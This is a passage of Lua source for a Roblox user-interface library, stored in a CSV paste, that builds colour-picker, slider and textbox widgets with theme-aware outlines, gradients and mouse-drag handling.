id,title,username,language,date,content

					if colorpicker.flag and colorpicker.flag ~= """" then
						library.flags[colorpicker.flag] = colorpicker.default
					end

					function colorpicker:RefreshHue()
						local x = (mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X
						local y = (mouse.Y - colorpicker.hue.AbsolutePosition.Y) / colorpicker.hue.AbsoluteSize.Y
						colorpicker.hueselectorpointer:TweenPosition(UDim2.new(math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 0.952 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 0, math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 0.885 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
						colorpicker:Set(Color3.fromHSV(colorpicker.color, math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 1 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 1 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y)))
					end

					function colorpicker:RefreshSelector()
						local pos = math.clamp((mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X, 0, 1)
						colorpicker.color = 1 - pos
						colorpicker.pointer:TweenPosition(UDim2.new(pos, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
						colorpicker.hue.BackgroundColor3 = Color3.fromHSV(1 - pos, 1, 1)

						local x = (colorpicker.hueselectorpointer.AbsolutePosition.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X
						local y = (colorpicker.hueselectorpointer.AbsolutePosition.Y - colorpicker.hue.AbsolutePosition.Y) / colorpicker.hue.AbsoluteSize.Y
						colorpicker:Set(Color3.fromHSV(colorpicker.color, math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 1 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 1 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y)))
					end

					function colorpicker:Set(value)
						local color = Color3.new(math.clamp(value.r, 0, 1), math.clamp(value.g, 0, 1), math.clamp(value.b, 0, 1))
						colorpicker.value = color
						if colorpicker.flag and colorpicker.flag ~= """" then
							library.flags[colorpicker.flag] = color
						end
						local clr = Color3.new(math.clamp(color.R / 1.7, 0, 1), math.clamp(color.G / 1.7, 0, 1), math.clamp(color.B / 1.7, 0, 1))
						colorpicker.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, color), ColorSequenceKeypoint.new(1, clr)})
						pcall(colorpicker.callback, color)
					end

					function colorpicker:Get(value)
						return colorpicker.value
					end

					colorpicker:Set(colorpicker.default)

					local dragging_selector = false
					local dragging_hue = false

					colorpicker.selector.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_selector = true
							colorpicker:RefreshSelector()
						end
					end)

					colorpicker.selector.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_selector = false
							colorpicker:RefreshSelector()
						end
					end)

					colorpicker.hue.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_hue = true
							colorpicker:RefreshHue()
						end
					end)

					colorpicker.hue.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging_hue = false
							colorpicker:RefreshHue()
						end
					end)

					uis.InputChanged:Connect(function(input)
						if dragging_selector and input.UserInputType == Enum.UserInputType.MouseMovement then
							colorpicker:RefreshSelector()
						end
						if dragging_hue and input.UserInputType == Enum.UserInputType.MouseMovement then
							colorpicker:RefreshHue()
						end
					end)

					local inputBegan = function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							for i, v in pairs(window.OpenedColorPickers) do
								if v and i ~= colorpicker.MainPicker then
									i.Visible = false
									window.OpenedColorPickers[i] = false
								end
							end

							colorpicker.MainPicker.Visible = not colorpicker.MainPicker.Visible
							window.OpenedColorPickers[colorpicker.MainPicker] = colorpicker.MainPicker.Visible
							if window.OpenedColorPickers[colorpicker.MainPicker] then
								colorpicker.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
							else
								colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
							end
						end
					end

					colorpicker.Main.InputBegan:Connect(inputBegan)
					colorpicker.Outline.InputBegan:Connect(inputBegan)
					colorpicker.BlackOutline2.InputBegan:Connect(inputBegan)
					table.insert(library.items, colorpicker)

					return colorpicker
				end

				function toggle:AddSlider(min, default, max, decimals, callback, flag)
					local slider = {}
					slider.text = text or """"
					slider.callback = callback or function(value) end
					slider.min = min or 0
					slider.max = max or 100
					slider.decimals = decimals or 1
					slider.default = default or slider.min
					slider.flag = flag or ((toggle.text or """") .. #toggle.Items:GetChildren())

					slider.value = slider.default
					local dragging = false

					slider.Main = Instance.new(""TextButton"", sector.Items)
					slider.Main.Name = ""slider""
					slider.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					slider.Main.Position = UDim2.fromOffset(0, 0)
					slider.Main.BorderSizePixel = 0
					slider.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 12)
					slider.Main.AutoButtonColor = false
					slider.Main.Text = """"
					slider.Main.ZIndex = 7

					slider.InputLabel = Instance.new(""TextLabel"", slider.Main)
					slider.InputLabel.BackgroundTransparency = 1
					slider.InputLabel.Size = slider.Main.Size
					slider.InputLabel.Font = window.theme.font
					slider.InputLabel.Text = ""0""
					slider.InputLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
					slider.InputLabel.Position = slider.Main.Position
					slider.InputLabel.Selectable = false
					slider.InputLabel.TextSize = 15
					slider.InputLabel.ZIndex = 9
					slider.InputLabel.TextStrokeTransparency = 1
					slider.InputLabel.TextXAlignment = Enum.TextXAlignment.Center
					updateevent.Event:Connect(function(theme)
						slider.InputLabel.Font = theme.font
						slider.InputLabel.TextColor3 = theme.itemscolor
					end)

					slider.BlackOutline2 = Instance.new(""Frame"", slider.Main)
					slider.BlackOutline2.Name = ""blackline""
					slider.BlackOutline2.ZIndex = 4
					slider.BlackOutline2.Size = slider.Main.Size + UDim2.fromOffset(6, 6)
					slider.BlackOutline2.BorderSizePixel = 0
					slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					slider.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						slider.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
					end)

					slider.Outline = Instance.new(""Frame"", slider.Main)
					slider.Outline.Name = ""blackline""
					slider.Outline.ZIndex = 4
					slider.Outline.Size = slider.Main.Size + UDim2.fromOffset(4, 4)
					slider.Outline.BorderSizePixel = 0
					slider.Outline.BackgroundColor3 = window.theme.outlinecolor
					slider.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						slider.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					slider.BlackOutline = Instance.new(""Frame"", slider.Main)
					slider.BlackOutline.Name = ""blackline""
					slider.BlackOutline.ZIndex = 4
					slider.BlackOutline.Size = slider.Main.Size + UDim2.fromOffset(2, 2)
					slider.BlackOutline.BorderSizePixel = 0
					slider.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					slider.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						slider.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					slider.Gradient = Instance.new(""UIGradient"", slider.Main)
					slider.Gradient.Rotation = 90
					slider.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(41, 41, 41))})

					slider.SlideBar = Instance.new(""Frame"", slider.Main)
					slider.SlideBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					slider.SlideBar.ZIndex = 8
					slider.SlideBar.BorderSizePixel = 0
					slider.SlideBar.Size = UDim2.fromOffset(0, slider.Main.Size.Y.Offset)

					slider.Gradient2 = Instance.new(""UIGradient"", slider.SlideBar)
					slider.Gradient2.Rotation = 90
					slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.accentcolor), ColorSequenceKeypoint.new(1, window.theme.accentcolor2)})
					updateevent.Event:Connect(function(theme)
						slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.accentcolor), ColorSequenceKeypoint.new(1, theme.accentcolor2)})
					end)

					slider.BlackOutline2.MouseEnter:Connect(function()
						slider.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
					end)
					slider.BlackOutline2.MouseLeave:Connect(function()
						slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					end)

					if slider.flag and slider.flag ~= """" then
						library.flags[slider.flag] = slider.default or slider.min or 0
					end

					function slider:Get()
						return slider.value
					end

					function slider:Set(value)
						slider.value = math.clamp(math.round(value * slider.decimals) / slider.decimals, slider.min, slider.max)
						local percent = 1 - ((slider.max - slider.value) / (slider.max - slider.min))
						if slider.flag and slider.flag ~= """" then
							library.flags[slider.flag] = slider.value
						end
						slider.SlideBar:TweenSize(UDim2.fromOffset(percent * slider.Main.AbsoluteSize.X, slider.Main.AbsoluteSize.Y), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
						slider.InputLabel.Text = slider.value
						pcall(slider.callback, slider.value)
					end
					slider:Set(slider.default)

					function slider:Refresh()
						local mousepos = game:GetService(""Workspace"").CurrentCamera:WorldToViewportPoint(mouse.Hit.p)
						local percent = math.clamp(mousepos.X - slider.SlideBar.AbsolutePosition.X, 0, slider.Main.AbsoluteSize.X) / slider.Main.AbsoluteSize.X
						local value = math.round((slider.min + (slider.max - slider.min) * percent) * slider.decimals) / slider.decimals
						value = math.clamp(value, slider.min, slider.max)
						slider:Set(value)
					end

					slider.SlideBar.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = true
							slider:Refresh()
						end
					end)

					slider.SlideBar.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = false
						end
					end)

					slider.Main.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = true
							slider:Refresh()
						end
					end)

					slider.Main.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = false
						end
					end)

					uis.InputChanged:Connect(function(input)
						if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
							slider:Refresh()
						end
					end)

					sector:FixSize()
					table.insert(library.items, slider)

					return slider
				end

				toggle.Main.MouseButton1Down:Connect(function()
					toggle:Set(not toggle.CheckedFrame.Visible)
				end)

				toggle.Label.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						toggle:Set(not toggle.CheckedFrame.Visible)
					end
				end)

				local MouseEnter = function()
					toggle.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end

				local MouseLeave = function()
					toggle.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end

				toggle.Label.MouseEnter:Connect(MouseEnter)
				toggle.Label.MouseLeave:Connect(MouseLeave)
				toggle.BlackOutline2.MouseEnter:Connect(MouseEnter)
				toggle.BlackOutline2.MouseLeave:Connect(MouseLeave)

				sector:FixSize()
				table.insert(library.items, toggle)

				return toggle
			end

			function sector:AddTextbox(text, default, callback, flag)
				local textbox = {}
				textbox.text = text or """"
				textbox.callback = callback or function() end
				textbox.default = default
				textbox.value = """"
				textbox.flag = flag or text or """"

				textbox.Label = Instance.new(""TextButton"", sector.Items)
				textbox.Label.Name = ""Label""
				textbox.Label.AutoButtonColor = false
				textbox.Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				textbox.Label.BackgroundTransparency = 1
				textbox.Label.Position = UDim2.fromOffset(sector.Main.Size.X.Offset, 0)
				textbox.Label.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 0)
				textbox.Label.Font = window.theme.font
				textbox.Label.ZIndex = 5
				textbox.Label.Text = textbox.text
				textbox.Label.TextColor3 = window.theme.itemscolor
				textbox.Label.TextSize = 15
				textbox.Label.TextStrokeTransparency = 1
				textbox.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					textbox.Label.Font = theme.font
				end)

				textbox.Holder = Instance.new(""Frame"", sector.Items)
				textbox.Holder.Name = ""holder""
				textbox.Holder.ZIndex = 5
				textbox.Holder.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 14)
				textbox.Holder.BorderSizePixel = 0
				textbox.Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

				textbox.Gradient = Instance.new(""UIGradient"", textbox.Holder)
				textbox.Gradient.Rotation = 90
				textbox.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))})

				textbox.Main = Instance.new(""TextBox"", textbox.Holder)
				textbox.Main.PlaceholderText = textbox.text
				textbox.Main.PlaceholderColor3 = Color3.fromRGB(190, 190, 190)
				textbox.Main.Text = """"
				textbox.Main.BackgroundTransparency = 1
				textbox.Main.Font = window.theme.font
				textbox.Main.Name = ""textbox""
				textbox.Main.MultiLine = false
				textbox.Main.ClearTextOnFocus = false
				textbox.Main.ZIndex = 5
				textbox.Main.TextScaled = true
				textbox.Main.Size = textbox.Holder.Size
				textbox.Main.TextSize = 15
				textbox.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
				textbox.Main.BorderSizePixel = 0
				textbox.Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
				textbox.Main.TextXAlignment = Enum.TextXAlignment.Left

				if textbox.flag and textbox.flag ~= """" then
					library.flags[textbox.flag] = textbox.default or """"
				end

				function textbox:Set(text)
					textbox.value = text
					textbox.Main.Text = text
					if textbox.flag and textbox.flag ~= """" then
						library.flags[textbox.flag] = text
					end
					pcall(textbox.callback, text)
				end
				updateevent.Event:Connect(function(theme)
					textbox.Main.Font = theme.font
				end)

				function textbox:Get()
					return textbox.value
				end

				if textbox.default then
					textbox:Set(textbox.default)
				end

				textbox.Main.FocusLost:Connect(function()
					textbox:Set(textbox.Main.Text)
				end)

				textbox.BlackOutline2 = Instance.new(""Frame"", textbox.Main)
				textbox.BlackOutline2.Name = ""blackline""
				textbox.BlackOutline2.ZIndex = 4
				textbox.BlackOutline2.Size = textbox.Main.Size + UDim2.fromOffset(6, 6)
				textbox.BlackOutline2.BorderSizePixel = 0
				textbox.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				textbox.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					textbox.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				textbox.Outline = Instance.new(""Frame"", textbox.Main)
				textbox.Outline.Name = ""blackline""
				textbox.Outline.ZIndex = 4
				textbox.Outline.Size = textbox.Main.Size + UDim2.fromOffset(4, 4)
				textbox.Outline.BorderSizePixel = 0
				textbox.Outline.BackgroundColor3 = window.theme.outlinecolor
				textbox.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					textbox.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				textbox.BlackOutline = Instance.new(""Frame"", textbox.Main)
				textbox.BlackOutline.Name = ""blackline""
				textbox.BlackOutline.ZIndex = 4
				textbox.BlackOutline.Size = textbox.Main.Size + UDim2.fromOffset(2, 2)
				textbox.BlackOutline.BorderSizePixel = 0
				textbox.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				textbox.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					textbox.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				textbox.BlackOutline2.MouseEnter:Connect(function()
					textbox.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)
				textbox.BlackOutline2.MouseLeave:Connect(function()
					textbox.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end)

				sector:FixSize()
				table.insert(library.items, textbox)

				return textbox
			end

			function sector:AddSlider(text, min, default, max, decimals, callback, flag)
				local slider = {}
				slider.text = text or """"
				slider.callback = callback or function(value) end
				slider.min = min or 0
				slider.max = max or 100
				slider.decimals = decimals or 1
				slider.default = default or slider.min
				slider.flag = flag or text or """"

				slider.value = slider.default
				local dragging = false

				slider.MainBack = Instance.new(""Frame"", sector.Items)
				slider.MainBack.Name = ""MainBack""
				slider.MainBack.ZIndex = 7
				slider.MainBack.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 25)
				slider.MainBack.BorderSizePixel = 0
				slider.MainBack.BackgroundTransparency = 1

				slider.Label = Instance.new(""TextLabel"", slider.MainBack)
				slider.Label.BackgroundTransparency = 1
				slider.Label.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 6)
				slider.Label.Font = window.theme.font
				slider.Label.Text = slider.text .. "":""
				slider.Label.TextColor3 = window.theme.itemscolor
				slider.Label.Position = UDim2.fromOffset(0, 0)
				slider.Label.TextSize = 15
				slider.Label.ZIndex = 4
				slider.Label.TextStrokeTransparency = 1
				slider.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					slider.Label.Font = theme.font
					slider.Label.TextColor3 = theme.itemscolor
				end)

				local size = textservice:GetTextSize(slider.Label.Text, slider.Label.TextSize, slider.Label.Font, Vector2.new(200, 300))
				slider.InputLabel = Instance.new(""TextBox"", slider.MainBack)
				slider.InputLabel.BackgroundTransparency = 1
				slider.InputLabel.ClearTextOnFocus = false
				slider.InputLabel.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - size.X - 15, 12)
				slider.InputLabel.Font = window.theme.font
				slider.InputLabel.Text = ""0""
				slider.InputLabel.TextColor3 = window.theme.itemscolor
				slider.InputLabel.Position = UDim2.fromOffset(size.X + 3, - 3)
				slider.InputLabel.TextSize = 15
				slider.InputLabel.ZIndex = 4
				slider.InputLabel.TextStrokeTransparency = 1
				slider.InputLabel.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					slider.InputLabel.Font = theme.font
					slider.InputLabel.TextColor3 = theme.itemscolor

					local size = textservice:GetTextSize(slider.Label.Text, slider.Label.TextSize, slider.Label.Font, Vector2.new(200, 300))
					slider.InputLabel.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - size.X - 15, 12)
				end)

				slider.Main = Instance.new(""TextButton"", slider.MainBack)
				slider.Main.Name = ""slider""
				slider.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				slider.Main.Position = UDim2.fromOffset(0, 15)
				slider.Main.BorderSizePixel = 0
				slider.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 12)
				slider.Main.AutoButtonColor = false
				slider.Main.Text = """"
				slider.Main.ZIndex = 5

				slider.BlackOutline2 = Instance.new(""Frame"", slider.Main)
				slider.BlackOutline2.Name = ""blackline""
				slider.BlackOutline2.ZIndex = 4
				slider.BlackOutline2.Size = slider.Main.Size + UDim2.fromOffset(6, 6)
				slider.BlackOutline2.BorderSizePixel = 0
				slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				slider.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					slider.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				slider.Outline = Instance.new(""Frame"", slider.Main)
				slider.Outline.Name = ""blackline""
				slider.Outline.ZIndex = 4
				slider.Outline.Size = slider.Main.Size + UDim2.fromOffset(4, 4)
				slider.Outline.BorderSizePixel = 0
				slider.Outline.BackgroundColor3 = window.theme.outlinecolor
				slider.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					slider.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				slider.BlackOutline = Instance.new(""Frame"", slider.Main)
				slider.BlackOutline.Name = ""blackline""
				slider.BlackOutline.ZIndex = 4
				slider.BlackOutline.Size = slider.Main.Size + UDim2.fromOffset(2, 2)
				slider.BlackOutline.BorderSizePixel = 0
				slider.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				slider.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					slider.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				slider.Gradient = Instance.new(""UIGradient"", slider.Main)
				slider.Gradient.Rotation = 90
				slider.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(41, 41, 41))})

				slider.SlideBar = Instance.new(""Frame"", slider.Main)
				slider.SlideBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				slider.SlideBar.ZIndex = 5
				slider.SlideBar.BorderSizePixel = 0
				slider.SlideBar.Size = UDim2.fromOffset(0, slider.Main.Size.Y.Offset)

				slider.Gradient2 = Instance.new(""UIGradient"", slider.SlideBar)
				slider.Gradient2.Rotation = 90
				slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.accentcolor), ColorSequenceKeypoint.new(1, window.theme.accentcolor2)})
				updateevent.Event:Connect(function(theme)
					slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.accentcolor), ColorSequenceKeypoint.new(1, theme.accentcolor2)})
				end)

				slider.BlackOutline2.MouseEnter:Connect(function()
					slider.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)
				slider.BlackOutline2.MouseLeave:Connect(function()
					slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end)

				if slider.flag and slider.flag ~= """" then
					library.flags[slider.flag] = slider.default or slider.min or 0
				end

				function slider:Get()
					return slider.value
				end

				function slider:Set(value)
					slider.value = math.clamp(math.round(value * slider.decimals) / slider.decimals, slider.min, slider.max)
					local percent = 1 - ((slider.max - slider.value) / (slider.max - slider.min))
					if slider.flag and slider.flag ~= """" then
						library.flags[slider.flag] = slider.value
					end
					slider.SlideBar:TweenSize(UDim2.fromOffset(percent * slider.Main.AbsoluteSize.X, slider.Main.AbsoluteSize.Y), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
					slider.InputLabel.Text = slider.value
					pcall(slider.callback, slider.value)
				end
				slider:Set(slider.default)

				slider.InputLabel.FocusLost:Connect(function(Return)
					if not Return then
						return 
					end

					if (slider.InputLabel.Text:match(""^%d + $"")) then
						slider:Set(slider.InputLabel.Text)
					else
						slider.InputLabel.Text = slider.value
					end
				end)

				function slider:Refresh()
					local mousepos = game:GetService(""Workspace"").CurrentCamera:WorldToViewportPoint(mouse.Hit.p)
					local percent = math.clamp(mousepos.X - slider.SlideBar.AbsolutePosition.X, 0, slider.Main.AbsoluteSize.X) / slider.Main.AbsoluteSize.X
					local value = math.round((slider.min + (slider.max - slider.min) * percent) * slider.decimals) / slider.decimals
					value = math.clamp(value, slider.min, slider.max)
					slider:Set(value)
				end

				slider.SlideBar.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = true
						slider:Refresh()
					end
				end)

				slider.SlideBar.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = false
					end
				end)

				slider.Main.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = true
						slider:Refresh()
					end
				end)

				slider.Main.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = false
					end
				end)

				uis.InputChanged:Connect(function(input)
					if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
						slider:Refresh()
					end
				end)

				sector:FixSize()
				table.insert(library.items, slider)
				return slider
			end

			function sector:AddColorpicker(text, default, callback, flag)
				local colorpicker = {}

				colorpicker.text = text or """"
				colorpicker.callback = callback or function() end
				colorpicker.default = default or Color3.fromRGB(255, 255, 255)
				colorpicker.value = colorpicker.default
				colorpicker.flag = flag or text or """"

				colorpicker.Label = Instance.new(""TextLabel"", sector.Items)
				colorpicker.Label.BackgroundTransparency = 1
				colorpicker.Label.Size = UDim2.fromOffset(156, 10)
				colorpicker.Label.ZIndex = 4
				colorpicker.Label.Font = window.theme.font
				colorpicker.Label.Text = colorpicker.text
				colorpicker.Label.TextColor3 = window.theme.itemscolor
				colorpicker.Label.TextSize = 15
				colorpicker.Label.TextStrokeTransparency = 1
				colorpicker.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					colorpicker.Label.Font = theme.font
					colorpicker.Label.TextColor3 = theme.itemscolor
				end)

				colorpicker.Main = Instance.new(""Frame"", colorpicker.Label)
				colorpicker.Main.ZIndex = 6
				colorpicker.Main.BorderSizePixel = 0
				colorpicker.Main.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 29, 0)
				colorpicker.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				colorpicker.Main.Size = UDim2.fromOffset(16, 10)

				colorpicker.Gradient = Instance.new(""UIGradient"", colorpicker.Main)
				colorpicker.Gradient.Rotation = 90

				local clr = Color3.new(math.clamp(colorpicker.value.R / 1.7, 0, 1), math.clamp(colorpicker.value.G / 1.7, 0, 1), math.clamp(colorpicker.value.B / 1.7, 0, 1))
				colorpicker.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, colorpicker.value), ColorSequenceKeypoint.new(1, clr)})

				colorpicker.BlackOutline2 = Instance.new(""Frame"", colorpicker.Main)
				colorpicker.BlackOutline2.Name = ""blackline""
				colorpicker.BlackOutline2.ZIndex = 4
				colorpicker.BlackOutline2.Size = colorpicker.Main.Size + UDim2.fromOffset(6, 6)
				colorpicker.BlackOutline2.BorderSizePixel = 0
				colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					colorpicker.BlackOutline2.BackgroundColor3 = window.OpenedColorPickers[colorpicker.MainPicker] and theme.accentcolor or theme.outlinecolor2
				end)

				colorpicker.Outline = Instance.new(""Frame"", colorpicker.Main)
				colorpicker.Outline.Name = ""blackline""
				colorpicker.Outline.ZIndex = 4
				colorpicker.Outline.Size = colorpicker.Main.Size + UDim2.fromOffset(4, 4)
				colorpicker.Outline.BorderSizePixel = 0
				colorpicker.Outline.BackgroundColor3 = window.theme.outlinecolor
				colorpicker.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					colorpicker.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				colorpicker.BlackOutline = Instance.new(""Frame"", colorpicker.Main)
				colorpicker.BlackOutline.Name = ""blackline""
				colorpicker.BlackOutline.ZIndex = 4
				colorpicker.BlackOutline.Size = colorpicker.Main.Size + UDim2.fromOffset(2, 2)
				colorpicker.BlackOutline.BorderSizePixel = 0
				colorpicker.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
